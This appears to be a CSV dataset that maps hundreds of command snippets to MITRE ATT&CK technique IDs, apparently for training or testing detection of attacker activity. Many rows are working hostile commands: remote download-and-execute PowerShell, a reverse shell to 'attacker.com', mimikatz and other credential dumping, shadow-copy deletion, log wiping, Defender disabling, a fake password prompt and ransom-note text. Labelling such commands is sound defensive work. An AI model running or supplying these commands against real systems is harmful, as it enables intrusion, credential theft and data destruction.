command,mitre_id
$PasswordProfile.Password = $password,T1136
ProtocolHandler.exe {REMOTEURL},T1105
/var/logs,T1070
cd $stratus_path,T1552
"reg query ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion"" /v CurrentBuildNumber",T1082
as @/path/to/input-file,T1005
regini.exe {PATH}:hidden.ini,T1564
net group /domain,T1069
"[ ""$(uname)"" = 'FreeBSD' ] && /bin/echo ""#\!/bin/sh"" > ""testdirwithspaceend /init "" && echo 'echo ""print(\""running T1035.006 with space after filename to masquerade init\"")"" | python3.9' >> ""testdirwithspaceend /init "" && echo ""exit"" >> ""testdirwithspaceend /init "" || /usr/bin/echo -e ""%d\na\n#!/usr/bin/perl\nprint \""running T1035.006 with space after filename to masquerade init\\n\"";\nqx/cp \/usr\/bin\/perl 'init '/;\nqx/'.\/init ' -e 'sleep 5'/;\n.\nwq\n"" | ed 'testdirwithspaceend /init ' >/dev/null",T1036
Limit,T1218
"if [ -f /sys/class/dmi/id/chassis_vendor ]; then cat /sys/class/dmi/id/chassis_vendor | grep -i ""Xen\|Bochs\|QEMU""; fi",T1082
kernel32.beep,T1497
wevtutil cl security,T1070
wermgr.exe,T1055
"echo ""$command"" > /etc/cron.d/$cron_script_name",T1053
"$storageAccountObjects | Format-Table -Property ResourceGroup, StorageAccountName, FileShareName, ContainerName, BlobName, TableName, QueueName -AutoSize -Wrap",T1619
$handle | get-member -erroraction silentlycontinue | out-file $output_file -append,T1012
SecKeychainItemCopyAttributesAndData,T1555
printenv LANG,T1614
New-Item -Type Directory $outputZip -ErrorAction Ignore -Force | Out-Null,T1005
netsh advfirewall firewall show rule name=all,T1016
tac -s 'RANDOM' /path/to/input-file,T1005
Get-ADGroupMember Administrators -Recursive,T1482
interactiveMode: Always,T1059
"$sheet.Cells.Item(12,1) = ""=FWRITELN(A5, `""Set oStream = CreateObject(`""`""ADODB.Stream`""`"")`"")""",T1204
oldchecks -noninteractive -consoleoutput,T1082
"xbootmgr.exe -trace ""{boot|hibernate|standby|shutdown|rebootCycle}"" -callBack {PATH:.exe}",T1202
echo %APPDATA%,T1083
HKLM\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile,T1562
reg export HKLM\sam %temp%\sam,T1003
./stratus warmup aws.defense-evasion.cloudtrail-lifecycle-rule,T1562
"reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"" /v NoSetTaskbar /t REG_DWORD /d 1 /f",T1112
CommandLine = $CommandLine,T1218
file /bin/pwd,T1083
DeviceInformation,T1082
taskset 1 /bin/sh,T1059
"Set-ItemProperty -Path ""HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager"" -Name ""BootExecute"" -Value ""$registry_value"" -Type MultiString",T1547
debugfs,T1059
Zone.Identifier,T1553
<allocation unit='bytes'>4096</allocation>,T1222
"(([adsisearcher]'(objectcategory=organizationalunit)').FindAll()).Path | %{if(([ADSI]""$_"").gPlink){Write-Host ""[+] OU Path:""([ADSI]""$_"").Path;$a=((([ADSI]""$_"").gplink) -replace ""[[;]"" -split ""]"");for($i=0;$i -lt $a.length;$i++){if($a[$i]){Write-Host ""Policy Path[$i]:""([ADSI]($a[$i]).Substring(0,$a[$i].length-1)).Path;Write-Host ""Policy Name[$i]:""([ADSI]($a[$i]).Substring(0,$a[$i].length-1)).DisplayName} };Write-Output ""`n"" }}",T1087
msxsl.exe {PATH:.xml} {PATH:.xsl},T1220
"Set-ItemProperty -Path ""HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon"" -Name ""Shell-backup"" -Value ""$oldvalue"";",T1547
stdbuf -i0 /bin/sh,T1059
IVssBackupComponents,T1490
nmap $host_to_scan,T1046
HAL9TH,T1497
WSASend,T1106
virsh -c qemu:///system pool-create-as x dir --target /path/to/output-dir/,T1222
quser.exe,T1049
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/CreateProcess/Get-CreateProcessSystem.ps1'),T1106
%Temp%\setup.exe,T1027
"VSDiagnostics.exe start 2 /launch:{PATH:.exe} /launchArgs:""{CMD:args}""",T1127
sudo dd if=/dev/zero bs=1000 count=5 of=$system_log_path #log file filled with null bytes(zeros),T1070
"ContainerName = """"",T1619
~/Library/Preferences/ByHost,T1547
filename='/etc/rc.common';if [ ! -f $filename ];then sudo touch $filename;else sudo cp $filename /etc/rc.common.original;fi,T1037
if($restart){,T1547
LogMein,T1219
print /D:{PATH_ABSOLUTE:.dest.exe} {PATH_SMB:.source.exe},T1105
chsh -s /bin/sh art,T1059
reg query HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System /v SystemBiosVersion,T1082
mkdir -p /tmp/atomic-test-T1036.006,T1036
cmd /c tasklist,T1057
/altvba,T1137
"echo ""Description=Atomic Red Team Systemd Service"" >> $systemd_service_path/$systemd_service_file",T1543
tar -xf {PATH_SMB:.tar},T1105
DYLD_LIBRARY_PATH,T1574
md $folder_name,T1564
<physical unit='bytes'>5</physical>,T1222
ssh-agent /bin/sh,T1059
echo 'fd.close()' >> $python_script_name,T1059
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/DumpWCM.ps1'),T1555
"New-ItemProperty ""HKLM:\SOFTWARE\Policies\Microsoft\Windows\System"" -Name GroupPolicyRefreshTimeDC -PropertyType DWord -Value 0 -Force",T1484
vssadmin list shadows,T1680
CGEventTap,T1056
RegWrite,T1559
"else: import SimpleHTTPServer as s, SocketServer as ss",T1105
Set-ADAccountPassword,T1531
/Network/Library/Keychains/,T1555
"Write-Host ""Error: domain """"$domain_name"""" not found""",T1484
ufile.io,T1570
locate,T1083
SOFTWARE\Microsoft\.NETFramework\policy\v2.0,T1012
"Set-ItemProperty -Path $Path.PSPath -Name ""PROVIDERORDER"" -Value $UpdatedValue",T1003
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A",T1564
"Invoke-WebRequest $domain -UserAgent ""Opera/8.81 (Windows NT 6.0; U; en)"" | out-null",T1071
%CommonFiles%,T1547
Update.exe --createShortcut={PATH:.exe} -l=Startup,T1547
server: https://x,T1059
"""$mimikatz_exe"" ""sekurlsa::minidump $input_file"" ""sekurlsa::logonpasswords full"" exit",T1003
"Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table -Autosize",T1518
vssadmin delete shadows /all /quiet,T1490
"echo """" | ""$plink_file"" -batch ""$vm_host"" -ssh -l $vm_user -pw ""$vm_pass"" ""for i in `vim-cmd vmsvc/getallvms | awk 'NR>1 {print $1}'`; do vim-cmd vmsvc/power.off $i & done""",T1529
echo '$text_to_append' >> /etc/profile,T1546
wbadmin.msc,T1218
C:\program files\myapp.exe,T1574
ListBuckets,T1580
getprocesslist,T1057
"cmd.exe /c ""$local_folder\$local_executable"" kerberoast $flags /outfile:""$local_folder\$out_file""",T1558
‘autocheck autochk *’,T1112
"sudo find /var/log -name ""$system_log_name3*"" -exec unlink {} \; #using ""unlink"" execution",T1070
/var/cron/tabs/,T1053
HKEY_CURRENT_USER,T1027
New-Item -ItemType Directory -Path $fileSharePath,T1530
echo T1222.001_attrib2 >> $file_or_folder\T1222.001_attrib2.txt,T1222
Microsoft.Authorization/roleAssignments/write,T1098
for /R c:\ %f in (*.docx) do copy /Y %f %temp%\T1119_command_prompt_collection,T1119
httpsd,T1222
"""PathToAtomicsFolder\..\ExternalPayloads\PsExec.exe"" \\$target -accepteula -s ""cmd.exe""",T1053
WNetEnumResourceW,T1135
Evil.txt.exe,T1036
sudo defaults read /Library/Preferences/com.apple.alf,T1016
FileRecvWriteRand,T1027
"& ""$mimikatz_path"" ""privilege::debug"" ""misc::skeleton"" ""exit""",T1556
New-ItemProperty -Path $registryPath -Name $name -Value $Value -PropertyType STRING -Force,T1546
"cmd /c ""PathToAtomicsFolder\..\ExternalPayloads\nimgrab.exe"" $remote_file $destination_path",T1105
msinfo32.exe,T1036
find $search_path -name id_rsa 2>/dev/null -exec gcp --parents {} $output_folder \;,T1552
C:\Users\Public\WinSrcNT\It11.exe,T1005
KERBEROS::PTT,T1550
Invoke-ATHHTMLApplication -HTAUri $hta_uri -MSHTAFilePath $mshta_file_path,T1218
set comspec=$command_to_execute,T1216
HKCR\.enc,T1112
$which_python $python_binary_name,T1059
sudo $compiled_file $source_file,T1222
IKEEXT,T1543
"sh -c ""echo 'echo Hello from the Atomic Red Team' > $script_path""",T1059
netsh interface portproxy add v4tov4 listenport=$listenport connectport=$connectport connectaddress=$connectaddress,T1090
ImpersonateNamedPipeClient,T1134
"reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp"" /v PortNumber /t REG_DWORD /d $NEW_Remote_Port /f",T1021
"cmd.exe /c ping.exe 8.8.8.8 -n 70&&""%temp%\FontEDL.exe""",T1059
"C:\\windows\system32\rundll32.exe ""C:\ProgramData\ThumbNail\thumbnail.db""",T1218
pathExtension,T1106
C:\Windows\System32\inetsrv\appcmd.exe list apppool /config,T1003
"reg.exe add ""HKLM\SYSTEM\CurrentControlSet\Services\$weak_service_name"" /f /v ImagePath /d ""$malicious_service_path""",T1574
runscripthelper.exe surfacecheck \\?\{PATH_ABSOLUTE:.txt} {PATH_ABSOLUTE:folder},T1218
"echo ""python3 -c \""import os, base64;exec(base64.b64decode('aW1wb3J0IG9zCm9zLnBvcGVuKCdlY2hvIGF0b21pYyB0ZXN0IGZvciBDcmVhdGluZyBTeXN0ZW1kIFNlcnZpY2UgVDE1NDMuMDAyID4gL3RtcC9UMTU0My4wMDIuc3lzdGVtZC5zZXJ2aWNlLmNyZWF0aW9uJykK')) \"" "" >> /etc/init.d/T1543.002",T1543
busybox cat,T1548
"reg.exe import ""$registry_file""",T1546
bcdedit.exe,T1490
dotnet -consoleoutput -noninteractive,T1518
LastWriteTime,T1070
cron,T1053
"Copy-Item $profile\logins.json -Destination ""PathToAtomicsFolder\..\ExternalPayloads"" > $null",T1555
<key>/path/to/output-dir/output-file</key>,T1222
"""PathToAtomicsFolder\..\ExternalPayloads\PsExec.exe"" \\$remote_host -i -u $user_name -p $password -accepteula ""C:\Windows\System32\calc.exe""",T1569
mshta.exe {REMOTEURL},T1105
get-content -path $env:temp\T1552.005Test1.txt -erroraction silentlycontinue,T1552
"Write-Host ""Deploying AWS infrastructure... "" -NoNewLine",T1567
Get{Extension/Filter}Version,T1505
lshw,T1680
"echo ""5. We're more than negotiable and will definitely find the way to settle this quickly and reach an agreement which will satisfy both of us"" >> $env:Userprofile\Desktop\akira_readme.txt",T1486
"New-Item -Path ""C:\Users\$env:USERNAME\AppData\Local\Comms\Unistore\data\copy"" -ItemType Directory -ErrorAction Ignore",T1070
"Get-Item -Path ""HKLM:Software\Microsoft\Windows\CurrentVersion\RunOnceEx""",T1012
"$PYTHON_EXE -c ""print('Triggering Hook via usercustomize.py...')""",T1546
foreach($queue in $queues) {,T1619
RASSFM.DLL,T1556
C:\Users\<username>\Documents\Outlook Files,T1114
"mkdir ""c:\Temp""",T1105
"Boot, System",T1485
"$PathToAtomicsFolder\T1055.012\bin\x64\CreateProcessWithPipe.exe -program ""$hollow_binary_path"" -debug",T1055
"bcp ""SELECT payload_data FROM database.dbo.payloads WHERE id=1"" queryout ""C:\Windows\Temp\payload.exe"" -S localhost -T -c",T1105
"""PathToAtomicsFolder\..\ExternalPayloads\remcom.exe"" \\$remote_host /user:$user_name /pwd:$password cmd.exe",T1569
ls -la ~/Library/Application\ Support/MobileSync/Backup/,T1083
"rundll32.exe shell32.dll,ShellExec_RunDLL {PATH:.exe}",T1218
"Set-ItemProperty ""HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\AtomicRedTeam"" ""Impersonate"" 1 -Type DWord -Force",T1547
"Set objws = CreateObject(""Wscript.Shell"")",T1546
dscl . -create /Users/AtomicUser NFSHomeDirectory /Local/Users/AtomicUser,T1078
%APPDATA%,T1564
"$wc.DownloadFile($url, $output)",T1562
dnsmasq --conf-script='/path/to/command 1>&2',T1059
"Write-Host "" [!] ${user}:$password are valid credentials!`r`n""",T1110
sockstat -6 2>/dev/null || true,T1049
if (-not (Test-Path $registryPath)) {,T1562
/var/log/httpd/,T1070
kernel32!GetTickCountKernel32,T1497
SSH-2.0-OpenSSH_0.3xx.,T1205
UltraVNC.exe,T1036
fltMC.exe unload SysmonDrv,T1562
profile.ps1,T1546
uname -a >> $output_file,T1082
else { Copy-Item $_.FullName -Destination $dest -Force -ErrorAction SilentlyContinue },T1560
net start >> %temp%\download,T1007
ShellExecute,T1106
HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\,T1547
mosquitto -c /path/to/input-file,T1005
ssh-keygen -t rsa -f $HOME/.ssh/id_rsa -P,T1098
"Write-Host ""Extraction completed."" -ForegroundColor Green",T1562
aws iam list-roles,T1087
"wmic /Node:localhost /Namespace:\\root\Microsoft\Windows\Defender Path MSFT_MpPreference Get /format:list | findstr /i /C:""DisableRealtimeMonitoring"" /C:""ExclusionPath"" /C:""ExclusionExtension"" /C:""ExclusionProcess""",T1518
nmap --script=/path/to/temp-file,T1548
C:\Windows\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe $output_file,T1218
xz -c /path/to/input-file | xz -d,T1005
"& ""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"" $optional_args -h $domain -s subtree -f ""objectclass=computer"" *",T1087
Process List,T1057
"$excelApp.RegisterXLL(""PathToAtomicsFolder\T1137.006\bin\Addins\excelxll_x86.xll"")",T1137
netsh advfirewall firewall,T1518
photo_high_resj.png,T1036
"ntdsutil ""ac i ntds"" ""ifm"" ""create full $output_folder"" q q",T1003
echo $fish_encoded | b64decode -r | sh,T1140
0 3534848 linear /dev/loop0 94208,T1059
C:\Windows\System32\inetsrv\appcmd.exe list apppool /text:*,T1003
"type C:\temp\evil.exe > ""C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:evil.exe""",T1564
Filter = [Ref] $Filter;,T1546
chflags hidden /var/tmp/T1564.001_mac.txt,T1564
printf 'exit 0' | sudo tee -a /etc/rc.local,T1037
sh.stdout.pipe(this);,T1059
vssadmin.exe,T1490
"echo -e 'package main\nimport (\n\t""os""\n\t""net""\n\t""syscall""\n)\n\nfunc main(){\n\tfd, _ := syscall.Socket(syscall.AF_INET, syscall.SOCK_STREAM, 0)\n\tip := net.ParseIP(""attacker.com"").To4()\n\taddr := &syscall.SockaddrInet4{Port: 12345}\n\tcopy(addr.Addr[:], ip)\n\tsyscall.Connect(fd, addr)\n\tsyscall.Dup2(fd, 0)\n\tsyscall.Dup2(fd, 1)\n\tsyscall.Dup2(fd, 2)\n\tsyscall.Exec(""/bin/sh"", []string{""/bin/sh"", ""-i""}, os.Environ())\n}' >/path/to/temp-file.go",T1059
"sc create evilservice binPath=""\""c:\\ADS\\file.txt:cmd.exe\"" /c echo works > \""c:\ADS\works.txt\"""" DisplayName= ""evilservice"" start= auto\ & sc start evilservice",T1564
TracerPID,T1622
echo ldapadd -H ldap://$domain.$top_level_domain:389 -x -D $admin_user -w $admin_password -f tempadmin.ldif,T1136
Evasive Installutil invocation test failure. Installer assembly execution output did not match the expected output.,T1218
SecurityCenter2.AntiVirusProduct,T1518
dhclient -sf /bin/sh,T1059
"ysoserial.exe -o raw -f BinaryFormatter - g DataSet -c ""{CMD}"" > RecentViews & copy RecentViews %LOCALAPPDATA%\Microsoft\EventV~1\RecentViews & eventvwr.exe",T1548
for file in $(find $file_path -type f -name .netrc 2> /dev/null);do echo $file ; cat $file ; done,T1552
C:\\Windows\\Temp\\Report.06E17A5A-7325-4325-8E5D-E172EBA7FC5BK,T1074
Get-AcceptedDomain,T1482
dsenableroot -u art-tester -p art-tester -r art-root #new user,T1078
"Import-Module ""$ps_module""",T1048
ipconfig /all >> %temp%\download,T1016
HKLM\System\CurrentControlSet\Control\SecurityProviders\WDigest,T1112
"else { Write-Host "". "" -NoNewline}",T1110
"reg add ""HKLM\Software\Policies\Microsoft\Windows Defender"" /v ""DisableAntiSpyware"" /t REG_DWORD /d ""1"" /f >NUL 2>nul",T1562
echo User Domain: %USERDOMAIN% >> %file%,T1033
cat xx01,T1005
for %i in (C$ IPC$ ADMIN$) do net share %i /delete,T1070
"reg add ""HKEY_CLASSES_ROOT\Directory\Background\shell\Size Modify\command"" /ve /t REG_SZ /d ""C:\Windows\System32\calc.exe"" /f",T1547
kill_unwanted,T1562
unshare,T1611
sctasks,T1053
paste /path/to/input-file,T1005
.json,T1105
gcc @/path/to/input-file,T1005
sudo launchctl unload /Library/LaunchDaemons/com.carbonblack.daemon.plist,T1562
Mozilla/5.0 (Windows NT 6.3; rv:48.0) Gecko/20100101 Firefox/48.0,T1016
"Add-MsolRoleMember -RoleName ""Global Reader"" -RoleMemberEmailAddress ""$target_user""",T1098
coregen.exe /L {PATH_ABSOLUTE:.dll} dummy_assembly_name,T1055
cat >/path/to/temp-dir/y.py<<EOF,T1548
cmd.exe /c %s,T1059
srvdll.dll,T1036
dscl . -create /Users/$username UserShell /bin/zsh,T1136
reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f,T1548
"if ($row.FileShareName -ne """"){",T1530
public static void Main(string[] args) {,T1036
"$ADSearch.PropertiesToLoad.Add(""thumbnailphoto"") | Out-Null",T1552
"Set-ItemProperty ""HKLM:\Software\Policies\Microsoft\Windows Defender\Real-Time Protection"" -Name ""DisableIntrusionPreventionSystem"" -Value 1",T1562
copy /Y C:\Windows\System32\cmd.exe C:\Windows\System32\DisplaySwitch.exe,T1546
__tutma,T1071
fsutil usn deletejournal /D C:,T1070
--init,T1036
Get-ChildItem -Hidden C:\Users\$usernameinfo\AppData\Roaming\Microsoft\Credentials\,T1552
set file=$output_file_path\user_info_%random%.tmp,T1033
aws cloudtrail update-trail --name $cloudtrail_name --s3-bucket-name $s3_bucket_name --is-multi-region-trail --region $region,T1562
"Write-Host ""End of bruteforce""",T1110
"reg query ""HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\\Shell""",T1012
cowsay -f /path/to/script.pl x,T1548
$screenshot,T1113
expand {PATH_ABSOLUTE:.source.ext} {PATH_ABSOLUTE:.dest.ext},T1105
cdb.exe -pd -pn {process_name} .shell {CMD},T1127
"cd ""$env:userprofile\Downloads\T1036""",T1036
gcloud iam service-accounts create $service-account-name,T1078
C:\Windows\Microsoft.NET\Framework64\v<version>\InstallUtil.exe,T1218
malloc,T1055
ascii-xfr -ns /path/to/input-file,T1005
make --eval='$(shell /bin/sh 1>&0)' .,T1059
Disable-AntiPhishRule -Identity $test.Name -Confirm:$false,T1562
Get-ADObject -LDAPFilter '(UserAccountControl:1.2.840.113556.1.4.803:=$uac_prop)' -Server $domain,T1087
rustc /path/to/temp-file -o /path/to/output-file,T1222
"if (-not (Test-Path -Path""$env:TEMP\t1003.001-13-rdrleakdiag"")) {New-Item -ItemType Directory -Path $env:TEMP\t1003.001-13-rdrleakdiag -Force}",T1003
$conn.bind(),T1110
mmc wbadmin.msc delete catalog -quiet,T1218
winrm,T1021
windbg.exe -g {CMD},T1127
"osascript -e 'tell app ""System Preferences"" to activate' -e 'tell app ""System Preferences"" to activate' -e 'tell app ""System Preferences"" to display dialog ""Software Update requires that you type your password to apply changes."" & return & return default answer """" with icon 1 with hidden answer with title ""Software Update""'",T1056
cat /etc/passwd |grep nobody,T1078
"reg add ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\MyComputer\BackupPath"" /t REG_EXPAND_SZ /d ""%systemroot%\system32\notepad.exe"" /f",T1112
"octave-cli --eval 'format none; fid = fopen(""/path/to/input-file""); while(!feof(fid)); txt = fgetl(fid); disp(txt); endwhile; fclose(fid);'",T1005
"$orgWallpaper | Out-File -FilePath ""$pointer_to_orginal_wallpaper""",T1491
SYSTEM,T1569
$ACL.SetAccessRule($accessRule),T1505
/System/Library/LaunchDaemons/com.apple.emond.plist,T1546
luatex -shell-escape '\directlua{...}\end',T1548
test.gif,T1036
passwd $user_account #enter admin password > enter new password > confirm new password,T1531
echo $(echo $ENCODED) | base64 -d,T1140
"echo ""# THIS IS A COMMENT"" >> /etc/ufw/ufw.conf",T1562
Start-Process $file1,T1204
"Write-Host ""Minidump file, minidump_$lsass_pid.dmp can be found inside $env:TEMP\t1003.001-13-rdrleakdiag directory.""",T1003
"for bucket in ""$(aws s3 ls | cut -d "" "" -f3)""; do aws s3api list-objects-v2 --bucket $bucket --output text; done",T1619
"if (""$execution_option"" -eq ""insert_code"") {",T1528
"Start-Process 'C:\Program Files (x86)\LogMeIn Ignition\LMIIgnition.exe' ""/S""",T1219
"New-NetEventSession -Name Capture007 -LocalFilePath ""$ENV:Temp\sniff.etl""",T1040
"if [ -f /proc/ide/hd0/model ]; then cat /proc/ide/hd0/model | grep -i ""vmware\|vbox\|qemu\|virtual""; fi",T1082
C:\User\1\,T1074
sudo killall -SIGTERM $process_name,T1489
"Copy-Item ""$PathToAtomicsFolder\T1547.012\bin\AtomicTest.dll"" C:\Windows\System32\spool\prtprocs\x64\AtomicTest.dll",T1547
"$which_python -c 'import requests;import os;url = ""$script_url"";malicious_command = ""$executor $payload_file_name $script_args"";session = requests.session();source = session.get(url).content;fd = open(""$payload_file_name"", ""wb+"");fd.write(source);fd.close();os.system(malicious_command)'",T1059
echo too many secrets > $folder_name\$hidden_filename,T1564
HKEY_CURRENT_USER\Software\Microsoft\Office test\Special\Perf,T1137
net.exe user $user_account $new_password,T1531
"Add-Type -TypeDefinition @""",T1562
"gnuplot -e 'system(""/bin/sh 1>&0"")'",T1059
"New-LocalUser -Name ""$username"" -NoPassword",T1136
"sudo find /var/log -name ""$system_log_name2*"" -exec shred -u -z -n 3 {} \; #using ""shred"" execution",T1070
Get-GPPPassword -Verbose,T1552
$xlApp.Quit(),T1204
"copy ""$service_executable"" ""C:\Program Files\windows_service.exe""",T1574
%SystemDrive%\BypassDir\cscript //nologo %windir%\System32\winrm.vbs get wmicimv2/Win32_Process?Handle=4 -format:pretty,T1220
C:\system\screenshot.bmp,T1113
driverquery /v /fo list,T1652
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography MachineGuid,T1012
makecab {PATH_SMB:.exe} {PATH_ABSOLUTE}:file.cab,T1564
history -r /path/to/input-file,T1005
C:\windows\system32\cmd.exe /c start C:\windows\system32\\regsvr32.exe /s /iC:\windows\<filename>.dll,T1047
msfconsole,T1548
"echo ""put $local_path\$file_name"" | sftp $username@$remote_host:$remote_path",T1105
php -S 0.0.0.0:80,T1105
CloseServiceHandle(),T1489
net view /all,T1135
"""@ -Replace ""DOMAIN_SID"", $domain_sid | Out-File -Encoding OEM $env:TEMP\silver.bat",T1558
setlock - /bin/sh,T1059
"Invoke-RestMethod -Headers @{""Metadata""=""true""} -Method GET -Uri ""http://169.254.169.254/metadata/instance?api-version=2021-02-01"" | ConvertTo-Json -Depth 64 > $output_file",T1552
c:\ProgramData\found_shares.txt,T1074
Wow64SetThreadContext,T1106
Disconnect-ExchangeOnline -Confirm:$false,T1098
nslookup myip.opendns.comresolver1.opendns.com\r\n,T1016
"find / -path ""*.mozilla/firefox/*/places.sqlite"" 2>/dev/null -exec echo {} >> $output_file \;",T1217
echo x | xargs -o -a /dev/null /bin/sh,T1059
"Get-Item -Path ""HKCU:Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run""",T1012
Invoke-ATHRemoteFXvGPUDisablementCommand -ModuleName $module_name -ModulePath $module_path,T1218
attrib.exe -r $file_or_folder\*.* /s,T1222
"echo ""2. Paying us you save your TIME, MONEY, EFFORTS and be back on track within 24 hours approximately. Our decryptor works properly on any files or systems, so you will be able to check it by requesting a test decryption service from the beginning of our conversation. [f you decide to recover on your own, keep in mind that you can permanently lose access to some files or accidently corrupt them — in this case we won't be able to help. "" >> $env:Userprofile\Desktop\akira_readme.txt",T1486
[System.Runtime.InteropServices.Marshal]::ReleaseComObject($word) | Out-Null,T1137
certbot certonly -n -d x --standalone --dry-run --agree-tos --email x --logs-dir . --work-dir . --config-dir . --pre-hook '/bin/sh 1>&0 2>&0',T1059
diantz.exe {PATH_ABSOLUTE:.exe} {PATH_ABSOLUTE}:targetFile.cab,T1564
Force = $true,T1114
CSIDL_SYSTEM\cmd.exe /c ping -n 1,T1016
xmodmap -v /path/to/input-file,T1005
"wuauclt.exe /UpdateDeploymentProvider ""$arbitrary_dll"" /RunHandlerComServer",T1218
"php -r 'readfile(""/path/to/input-file"");'",T1005
npm exec /bin/sh,T1059
rake -p '...',T1548
net users >> %file%,T1033
"Remove-Item -Path (Join-Path ""$Env:SystemRoot\prefetch\"" (Get-ChildItem -Path ""$Env:SystemRoot\prefetch\*.pf"" -Name)[0])",T1070
LOCALAPPDATA%\MicroSoft Updatea\uplog.tmp,T1074
$_.Exception,T1098
.pdf.lnk,T1036
echo -n 111-11-1111 | base64,T1132
"Powershell.exe ""IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/a0dfca7056ef20295b156b8207480dc2465f94c3/Invoke-AppPathBypass.ps1'); Invoke-AppPathBypass -Payload 'C:\Windows\System32\cmd.exe'""",T1059
auditpol /set /category:”Account Logon” /success:disable /failure:disable,T1562
"New-Item -ItemType Key -Path ""HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run""",T1547
C:\Windows\system32\net.exe,T1574
"reg add ""HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection"" /v ""DisableIOAVProtection"" /t REG_DWORD /d ""1"" /f >NUL 2>nul",T1562
firewallsd,T1562
cat /etc/pam.d/system-auth,T1201
System.Windows.Forms.Clipboard.GetText(),T1115
"rundll32.exe dfshim.dll,ShOpenVerbApplication1",T1127
"local r,x=c:receive();local f=assert(io.popen(r,""r""));",T1059
"echo $ENCODED > $encoded_file && python3 -c ""import base64;dec=base64.b64decode(open('$encoded_file').read());print(dec.decode())""",T1140
regsvr32.exe /s {PATH:.dll},T1218
devinit.exe run -t msi-install -i {REMOTEURL:.msi},T1218
.vmx,T1564
actionstart = /path/to/command,T1059
net,T1087
if ($_ -match 'End of Silver Ticket attack') { break },T1558
git clone git@github.com:WhiteOakSecurity/GoAWSConsoleSpray.git,T1110
taskmgr,T1036
io.close(f);',T1105
ncftp,T1059
"Start-Service -Name ""$service_name""",T1543
"zip --password ""$encryption_password"" $test_folder/$test_file ./*",T1560
"echo ""### END INIT INFO"" >> /etc/init.d/T1543.002",T1543
Register-cimprovider -path {PATH_ABSOLUTE:.dll},T1218
_objc_getClass(),T1129
CallWindowProc,T1106
schtasks /create /sc,T1053
"echo '{""modules"":[{""type"":""command"",""key"":""x"",""text"":""exec /path/to/command""}]}' >/path/to/temp-file.jsonc",T1059
"reg add ""HKLM\SOFTWARE\Policies\Microsoft\FIDO"" /v ""AllowExternalDeviceSignon"" /t REG_DWORD /d 0 /f",T1112
Assembly.Load(),T1620
"rundll32.exe url.dll,OpenURL {PATH_ABSOLUTE:.url}",T1218
aws --no-sign-request s3 cp --recursive s3://$s3_bucket_name /tmp/$s3_bucket_name,T1530
FailureCommand,T1574
"echo ""import subprocess; subprocess.Popen(['open', '-a', '$exe_name'])"" > ""$SITE_PACKAGES/atomic_hook.pth""",T1546
"echo $machine >> ""$completed_list""",T1105
